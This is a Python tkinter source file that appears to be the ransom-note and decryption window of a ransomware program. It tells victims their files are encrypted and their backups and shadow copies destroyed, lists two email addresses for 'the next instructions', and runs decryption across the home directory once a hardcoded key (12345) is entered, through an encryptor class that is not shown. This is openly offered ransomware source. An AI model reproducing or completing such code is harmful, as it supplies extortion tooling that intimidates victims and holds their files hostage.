# Importing the necessary modules
import os
import time 
import threading
import tkinter as tk
from tkinter import messagebox, ttk
from PIL import Image, ImageTk


# Creating the class
class EncryptionWindow:
    def __init__(self, linuxEncryptor):
        self.root = tk.Tk()
        self.root.title("Files Encrypted")
        self.root.geometry("1080x900")
        self.root.configure(bg='white')

        # Getting the encryption method 
        self.linuxEncryptor = linuxEncryptor
        self.isDecrypting = False
        self.decryptionThread = None

        # Load demo image
        imagePath = os.path.join("gui", "output.jpg")
        self.loadImage(imagePath)

        # Displaying the warning messages
        self.loadWarningLabel("""
            All your files have been encrypted with military-grade encryption. """)

        self.loadWarningLabel("Backups were either encrypted or deleted or backup disk were formatted. ")

        # Displaying more warning messages
        self.loadWarningLabel("""
            Shadow copies also removed, so f8 or any other methods may damage \n the encryption. """)

        # Adding the description input box
        self.descriptionVar = tk.Text(
            self.root, height=2, width=50,
            bg='white', fg='black', wrap=tk.WORD, font=("Arial", 12)
        )
        self.descriptionVar.pack(pady=10)

        # Create label under the input box
        self.inputLabel = tk.Label(
            self.root,
            text="Please enter or paste your encryption key and click 'Submit'.",
            fg='black', bg='white'
        )
        self.inputLabel.pack(pady=5)

        # Add submit button
        self.enterButton = tk.Button(
            self.root,
            text="Decrypt Files",
            command=self.onEnter,
            width=20, height=2,
            bg='white', fg='black'
        )
        self.enterButton.pack(pady=10)

        # Adding the context menu
        self.contextMenu = tk.Menu(self.root, tearoff=0)
        self.contextMenu.add_command(label="Copy", command=self.copyText)
        self.contextMenu.add_command(label="Cut", command=self.cutText)
        self.contextMenu.add_command(label="Paste", command=self.pasteText)

        # Bind right-click to text box
        self.descriptionVar.bind("<Button-3>", self.showContextMenu)

        # Example warning/info labels
        self.loadWarningLabel("To info (decrypt your files) get in touch with us at: cmbonu@ymail.com or cboy.chinedu@gmail.com for the next instructions.")

        # Bind the close event to a custom function 
        self.root.protocol("WM_DELETE_WINDOW", self.onClose)

        # Loader frame
        self.loaderFrame = tk.Frame(self.root, bg='white')
        self.loaderFrame.pack(pady=20, fill='x', padx=50)
        
        # Progress bar
        self.progressBar = ttk.Progressbar(
            self.loaderFrame, 
            orient='horizontal', 
            length=400, 
            mode='determinate'
        )
        self.progressBar.pack(pady=10)
        
        # Status label
        self.statusLabel = tk.Label(
            self.loaderFrame, 
            text="Waiting for decryption to start...", 
            bg='white', 
            fg='black', 
            font=("Arial", 12)
        )
        self.statusLabel.pack(pady=5)
        
        # Percentage label
        self.percentageLabel = tk.Label(
            self.loaderFrame, 
            text="0%", 
            bg='white', 
            fg='blue', 
            font=("Arial", 14, "bold")
        )
        self.percentageLabel.pack(pady=5)

    # Show message box 
    def showMessageBox(self, title, message): 
        # Create a new top level window 
        customMessageBox = tk.Toplevel() 
        customMessageBox.title(title) 

        # Set the size of the custom message box 
        customMessageBox.geometry("400x200")

        # Create a label to display the message 
        messageLabel = tk.Label(customMessageBox, text=message, 
            wraplength=380, justify="center", font=("Arial", 12))
        messageLabel.pack(pady=20)

        # Create an OK button to close the message box 
        okButton = tk.Button(customMessageBox, text="OK", 
            command=customMessageBox.destroy, width=10)
        okButton.pack(pady=10)

        # Center the message box on the screen 
        customMessageBox.transient(self.root) 
        customMessageBox.grab_set() 
        self.root.wait_window(customMessageBox) 

    # Method called when clicking button
    def onEnter(self):
        if self.isDecrypting:
            return
            
        description = self.descriptionVar.get('1.0', tk.END).strip()

        # Using try except block 
        try: 
            # Calling the decryption function to decrypt the files, but first verify the code given 
            if int(description) == 12345: 
                # if the key code is correct, execute the block of code below 
                # Start decryption in a separate thread to avoid freezing the UI
                self.isDecrypting = True
                self.decryptionThread = threading.Thread(target=self.startDecryption)
                self.decryptionThread.daemon = True
                self.decryptionThread.start()
            else: 
                print("Invalid Key code")
                self.showMessageBox("Alert", "Invalid Key Code...")

        except Exception as error: 
            print(f"Invalid Code: {error}")
            self.showMessageBox("Alert", "Invalid Key Code... ")
    
    def startDecryption(self):
        try:
            # Navigate to the home directory 
            homeDir = os.path.expanduser("~")
            os.chdir(homeDir)

            # Get all files that need to be decrypted
            allFiles = []
            
            # Count files to decrypt
            self.statusLabel.config(text="Scanning files...")
            self.root.update()
            
            # Get files in current directory and subdirectories
            for root, dirs, files in os.walk(homeDir):
                for file in files:
                    filePath = os.path.join(root, file)
                    # Skip system directories and temporary files
                    if any(part.startswith('.') or part.startswith('$') for part in filePath.split(os.sep)):
                        continue
                    allFiles.append(filePath)
            
            totalFiles = len(allFiles)
            
            if totalFiles == 0:
                self.statusLabel.config(text="No files found to decrypt!")
                self.isDecrypting = False
                return
            
            # Update UI with progress
            self.statusLabel.config(text="Decrypting files...")
            self.progressBar['maximum'] = totalFiles
            self.progressBar['value'] = 0
            
            # Decrypt the main directory first
            self.linuxEncryptor.decryptFilesInDirectory(homeDir)
            
            # Update progress for main directory files
            decryptedCount = len([f for f in os.listdir(homeDir) if os.path.isfile(os.path.join(homeDir, f))])
            progressPercent = (decryptedCount / totalFiles) * 100
            self.progressBar['value'] = decryptedCount
            self.percentageLabel.config(text=f"{progressPercent:.1f}%")
            self.statusLabel.config(text=f"Decrypted {decryptedCount} of {totalFiles} files")
            self.root.update_idletasks()

            # Change to each directory in the current directory and decrypt all the 
            # files found which were encrypted 
            for entry in os.listdir(homeDir): 
                entryPath = os.path.join(homeDir, entry)

                # Check if the entry is a directory 
                if os.path.isdir(entryPath): 
                    os.chdir(entryPath)

                    # Decrypt the files 
                    self.linuxEncryptor.decryptFilesInDirectory(os.getcwd())
                    
                    # Update progress
                    dirFiles = len([f for f in os.listdir(entryPath) if os.path.isfile(os.path.join(entryPath, f))])
                    decryptedCount += dirFiles
                    progressPercent = (decryptedCount / totalFiles) * 100
                    self.progressBar['value'] = decryptedCount
                    self.percentageLabel.config(text=f"{progressPercent:.1f}%")
                    self.statusLabel.config(text=f"Decrypted {decryptedCount} of {totalFiles} files")
                    self.root.update_idletasks()

                    # Change directory 
                    os.chdir(homeDir)
   

        except Exception as e:
            print(f"Error during decryption: {e}")
            self.statusLabel.config(text="Error during decryption!")
            self.isDecrypting = False

    # Reopen the application 
    def reopen(self): 
        self.root.deiconify() 


    # Custom close function 
    def onClose(self): 
        if self.isDecrypting:
            response = messagebox.askyesno(
                "Confirm Exit", 
                "Decryption is in progress. Are you sure you want to exit?"
            )
            if not response:
                self.root.destroy()  

        else: 
            # self.root.withdraw() 
            # self.root.after(1000, self.reopen)
            self.root.destroy() 

    # Show context menu
    def showContextMenu(self, event):
        self.contextMenu.post(event.x_root, event.y_root)

    # Copy text
    def copyText(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(self.descriptionVar.get('1.0', tk.END).strip())

    # Cut text
    def cutText(self):
        self.copyText()
        self.descriptionVar.delete('1.0', tk.END)

    # Paste text
    def pasteText(self):
        try:
            text = self.root.clipboard_get()
            self.descriptionVar.insert(tk.END, text)
        except tk.TclError:
            pass

    # Load an image safely
    def loadImage(self, imagePath):
        try:
            image = Image.open(imagePath)
            image = image.resize((200, 200), Image.LANCZOS)
            photo = ImageTk.PhotoImage(image)

            imageLabel = tk.Label(self.root, image=photo, bg='white')
            imageLabel.image = photo  # keep reference
            imageLabel.pack(pady=10)

        except FileNotFoundError:
            warning = tk.Label(self.root, text="Image not found.", bg="white", fg="red")
            warning.pack(pady=5)

    # Load an info/warning label
    def loadWarningLabel(self, text):
        warningLabel = tk.Label(
            self.root,
            text=text,
            font=("Arial", 14),
            fg='black',
            bg='white',
            wraplength=1000,
            justify="left"
        )
        warningLabel.pack(pady=5)

    # Launch app
    def loadWindow(self):
        self.root.mainloop()